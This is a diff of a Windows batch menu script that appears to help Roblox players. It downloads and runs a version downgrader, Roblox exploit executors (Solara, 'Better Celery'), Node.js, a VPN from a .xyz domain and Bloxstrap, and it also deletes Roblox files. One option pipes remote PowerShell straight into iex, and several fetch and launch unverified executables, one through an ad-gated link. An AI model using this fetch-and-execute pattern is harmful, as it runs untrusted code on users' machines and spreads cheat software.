@@ -1,12 +1,15 @@
 @echo off
-cls
+set "powershellPath=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+
 :MENU
 cls
 echo.
-echo *** IRON-MARK-BATON 8 ***
-echo *** Samuraa1 Support (Made by BBD4) ***
+echo ====================================================
+echo    *** IRON-MARK-BATON 8.2 ***
+echo    *** Samuraa1 Support (Made by BBD4) ***
+echo ====================================================
 echo.
-echo  @@@@@@ @@@  @@@ @@@@@@@  @@@@@@@   @@@@@@  @@@@@@@  @@@@@@@    @@@@@@@  @@@@@@@  @@@@@@@  @@@  @@@ 
+echo @@@@@@ @@@  @@@ @@@@@@@  @@@@@@@   @@@@@@  @@@@@@@  @@@@@@@    @@@@@@@  @@@@@@@  @@@@@@@  @@@  @@@ 
 echo !@@     @@!  @@@ @@!  @@@ @@!  @@@ @@!  @@@ @@!  @@@   @!!      @@!  @@@ @@!  @@@ @@!  @@@ @@@  @@@ 
 echo  !@@!!  @!@  !@! @!@@!@!  @!@@!@!  @!@  !@! @!@!!@!    @!!      @!@!@!@  @!@!@!@  @!@  !@! @!@!@!@! 
 echo     !:! !!:  !!! !!:      !!:      !!:  !!! !!: :!!    !!:      !!:  !!! !!:  !!! !!:  !!!      !!! 
@@ -38,62 +41,105 @@ goto MENU
 
 :FIX_ROBLOX_VERSION_MISMATCH
 cls
-echo *** LOADING ***
+echo ====================================================
+echo           *** FIXING ROBLOX VERSION MISMATCH ***
+echo ====================================================
 echo.
-
-REM Скачиваем файл напрямую с GitHub
-powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ActualMasterOogway/Roblox-Downgrader/main/RobloxDowngrader.exe' -OutFile '%temp%\RobloxDowngrader.exe'; Start-Process '%temp%\RobloxDowngrader.exe' -Wait"
-
-REM Выполнение действий по исправлению версии Roblox
-echo IRON-MARK-BATON 8: SUCCESSFULLY! BYE-BYE
+echo *** Downloading and Running Roblox Downgrader ***
+echo.
+"%powershellPath%" -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ActualMasterOogway/Roblox-Downgrader/main/RobloxDowngrader.exe' -OutFile '%temp%\RobloxDowngrader.exe'; Start-Process '%temp%\RobloxDowngrader.exe' -Wait"
+echo.
+echo *** SUCCESSFULLY FIXED ROBLOX VERSION MISMATCH! ***
 pause
 goto MENU
 
-
 :INSTALL_SOLARA
 cls
-echo *** Downloading and Installing Solara V3 Bootstrapper ***
+echo ====================================================
+echo      *** Downloading and Installing Solara V3 ***
+echo ====================================================
 echo.
-powershell -Command "Start-Process 'https://linkvertise.com/1208172/solara-bootstrapper?o=sharing' -Wait"
+"%powershellPath%" -Command "Start-Process 'https://linkvertise.com/1208172/solara-bootstrapper?o=sharing' -Wait"
 echo.
-echo Opening Downloads folder...
+echo *** Opening Downloads folder... ***
 start "" "%USERPROFILE%\Downloads"
 pause
 goto MENU
 
 :INSTALL_NODEJS
 cls
-echo *** Downloading and Installing Node.js ***
+echo ====================================================
+echo     *** Checking for Existing Node.js Installation ***
+echo ====================================================
 echo.
-powershell -Command "Invoke-WebRequest -Uri 'https://nodejs.org/dist/v20.16.0/node-v20.16.0-x64.msi' -OutFile '%temp%\nodejs.msi'; Start-Process '%temp%\nodejs.msi' -Wait"
+
+set "nodejsPath=C:\Program Files\nodejs"
+
+if exist "%nodejsPath%" (
+    echo *** Found existing Node.js installation. Uninstalling... ***
+    echo.
+    
+    taskkill /f /im node.exe > NUL 2>&1
+    taskkill /f /im npm.exe > NUL 2>&1
+    taskkill /f /im npx.exe > NUL 2>&1
+    
+    if exist "%nodejsPath%\unins000.exe" (
+        echo *** Uninstalling Node.js via the uninstaller... ***
+        "%nodejsPath%\unins000.exe" /SILENT /NORESTART
+        timeout /t 5 > NUL
+    )
+
+    if exist "%nodejsPath%" (
+        echo *** Deleting Node.js installation folder... ***
+        rmdir /s /q "%nodejsPath%"
+    )
+    
+    echo *** Node.js uninstalled successfully! ***
+    echo.
+) else (
+    echo *** No existing Node.js installation found. ***
+    echo.
+)
+
+echo ====================================================
+echo     *** Downloading and Installing Node.js ***
+echo ====================================================
 echo.
-echo Node.js installation completed!
+"%powershellPath%" -Command "Invoke-WebRequest -Uri 'https://nodejs.org/dist/v20.16.0/node-v20.16.0-x64.msi' -OutFile '%temp%\nodejs.msi'; Start-Process '%temp%\nodejs.msi' -Wait"
+echo.
+echo *** Node.js installation completed! ***
 pause
 goto MENU
 
 :INSTALL_PLANETVPN
 cls
-echo *** Downloading and Installing Planet VPN ***
+echo ====================================================
+echo     *** Downloading and Installing Planet VPN ***
+echo ====================================================
 echo.
-powershell -Command "Invoke-WebRequest -Uri 'https://planetvpn-cdn.xyz/win/planetvpn.exe' -OutFile '%USERPROFILE%\Downloads\planetvpn.exe'"
+"%powershellPath%" -Command "Invoke-WebRequest -Uri 'https://planetvpn-cdn.xyz/win/planetvpn.exe' -OutFile '%USERPROFILE%\Downloads\planetvpn.exe'"
 echo.
-echo Opening the downloaded file...
+echo *** Opening the downloaded file... ***
 start "" "%USERPROFILE%\Downloads\planetvpn.exe"
 pause
 goto MENU
 
 :INSTALL_CELERY
 cls
-echo *** Downloading and Installing Better Celery ***
-powershell -NoProfile -Command "irm 'https://bcelery.github.io/a' | iex"
+echo ====================================================
+echo      *** Downloading and Installing Better Celery ***
+echo ====================================================
+"%powershellPath%" -NoProfile -Command "irm 'https://bcelery.github.io/a' | iex"
 echo.
-echo Better Celery installation completed!
+echo *** Better Celery installation completed! ***
 pause
 goto MENU
 
 :CONFIRM_DELETE
 cls
-echo Deleting Roblox Files...
+echo ====================================================
+echo           *** CONFIRM DELETE ROBLOX FILES ***
+echo ====================================================
 echo.
 echo 1. Yes
 echo 2. No (Back)
@@ -103,21 +149,24 @@ set /p confirm=Select (1-2):
 if "%confirm%"=="1" goto DELETE_ROBLOX
 if "%confirm%"=="2" goto MENU
 
+goto MENU
+
 :DELETE_ROBLOX
 cls
-echo *** Deleting Roblox Files ***
+echo ====================================================
+echo            *** DELETING ROBLOX FILES ***
+echo ====================================================
 echo.
 taskkill /F /IM RobloxPlayerBeta.exe > NUL 2>&1
 taskkill /f /im bloxstrap* > NUL 2>&1
 
-echo Deleting temp files of Roblox... 1/6
+echo *** Deleting temp files of Roblox... 1/6 ***
 del /s /q "%temp%\Roblox*.*"
 cls
 
-echo Deleting Roblox from AppData\Local... 2/6
+echo *** Deleting Roblox from AppData\Local... 2/6 ***
 cd /d "%localappdata%\Roblox"
 
-REM Delete all files and folders except LocalStorage and SupportSam_b2
 for /d %%i in (*) do (
     if /i not "%%i"=="LocalStorage" if /i not "%%i"=="SupportSam_b2" rmdir /s /q "%%i"
 )
@@ -126,57 +175,69 @@ for %%i in (*) do (
 )
 cls
 
-echo Deleting Roblox from AppData\Roaming... 3/6
+echo *** Deleting Roblox from AppData\Roaming... 3/6 ***
 del /s /q "%appdata%\Roblox*.*"
 rmdir /s /q "%appdata%\Roblox"
 cls
 
-echo Deleting folder of Roblox in Program Files (if installed)... 4/6
+echo *** Deleting Roblox from Program Files... 4/6 ***
 rmdir /s /q "C:\Program Files\Roblox"
 rmdir /s /q "C:\Program Files (x86)\Roblox"
 cls
 
-echo Deleting Roblox files from ProgramData... 5/6
+echo *** Deleting Roblox files from ProgramData... 5/6 ***
 del /s /q "%programdata%\Roblox*.*"
 rmdir /s /q "%programdata%\Roblox"
 cls
 
-echo SUCCESSFULLY DELETED!
+echo *** SUCCESSFULLY DELETED ROBLOX FILES! 6/6 ***
 pause
 goto MENU
 
 :INSTALL_BLOXSTRAP
 cls
-echo *** Downloading and Installing Bloxstrap ***
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/pizzaboxer/bloxstrap/releases/download/v2.7.0/Bloxstrap-v2.7.0.exe' -OutFile '%temp%\Bloxstrap-v2.7.0.exe'; Start-Process '%temp%\Bloxstrap-v2.7.0.exe'"
-echo Bloxstrap installation completed!
+echo ====================================================
+echo       *** Downloading and Installing Bloxstrap ***
+echo ====================================================
+"%powershellPath%" -Command "Invoke-WebRequest -Uri 'https://github.com/pizzaboxer/bloxstrap/releases/download/v2.7.0/Bloxstrap-v2.7.0.exe' -OutFile '%temp%\Bloxstrap-v2.7.0.exe'; Start-Process '%temp%\Bloxstrap-v2.7.0.exe'"
+echo.
+echo *** Bloxstrap installation completed! ***
 pause
 goto MENU
 
-
 :MAKE_BLOXSTRAP_CON
 cls
-echo *** Creating Bloxstrap Config ***
+echo ====================================================
+echo       *** Creating Bloxstrap Configuration ***
+echo ====================================================
 echo.
-echo Are you sure? (Changes BloxStrap Settings)
+echo Are you sure? (This will change Bloxstrap settings)
 echo 1. Yes
-echo 2. Back
+echo 2. No (Back)
 echo.
 set /p confirm=Select (1-2): 
 
 if "%confirm%"=="1" goto CREATE_BLOXSTRAP_CON
 if "%confirm%"=="2" goto MENU
 
+goto MENU
+
 :CREATE_BLOXSTRAP_CON
 cls
+echo ====================================================
+echo         *** CREATING BLOXSTRAP CONFIGURATION ***
+echo ====================================================
 echo.
-echo Killing Bloxstrap... 1/1
+echo *** Killing Bloxstrap Process... ***
 taskkill /f /im bloxstrap* > NUL 2>&1
 cls
 
-echo Setting CON (No logs)
-powershell -Command "Set-Content -Path '%localappdata%\Bloxstrap\Settings.json' -Value '{ `"BootstrapperStyle`": `"Redesigned`", `"NoLogs`": `"true`" }'"
-cls
+echo *** Setting Bloxstrap Roblox Player Name to "Roblox" ***
+echo.
+"%powershellPath%" -Command "Set-Content -Path '%localappdata%\Bloxstrap\Bloxstrap.json' -Value (@'{', '""Launcher"": {', '""Channel"": ""LIVE"",', '""Settings"": {', '""UseBootstrapper"": false,', '""StartInFullscreen"": true', '}', '}', '}' -join [System.Environment]::NewLine) -Force"
+
+echo *** Configuration completed! ***
+pause
 goto MENU
 
 :END
